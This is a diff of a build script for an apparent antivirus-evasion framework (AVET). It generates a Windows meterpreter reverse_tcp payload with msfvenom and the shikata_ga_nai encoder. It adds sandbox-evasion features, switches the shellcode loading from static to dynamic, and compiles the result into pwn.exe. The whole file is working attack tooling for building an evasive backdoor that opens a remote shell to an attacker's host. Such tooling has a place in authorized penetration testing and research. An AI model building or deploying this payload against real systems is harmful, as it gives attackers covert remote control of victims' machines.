@@ -14,7 +14,8 @@ LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
 
 # generate payload
-msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
+#msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
+msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f raw -a x86 --platform Windows > thepayload.bin
 
 # import feature construction interface
 . build/feature_construction.sh
@@ -23,16 +24,16 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shi
 add_feature fopen_sandbox_evasion
 
 # hide console window
-add_feature hide_console
+#add_feature hide_console
 
 # set shellcode source
-shellcode_source static_from_file
+shellcode_source dynamic_from_file
 
 # set shellcode binding technique
 shellcode_binding exec_shellcode
 
 # enable debug printing
-append_value PRINT_DEBUG "" get_shellcode.h	
+append_value PRINT_DEBUG "" shellcode_binding.h	
 
 # add gethostbyname killswitch evasion feature
 #append_value KVALUE localhost
@@ -42,5 +43,5 @@ append_value PRINT_DEBUG "" get_shellcode.h
 $win32_compiler -o pwn.exe avet.c
 
 # cleanup
-rm sc.txt && echo "" > defs.h
+# rm sc.txt
 cleanup_techniques
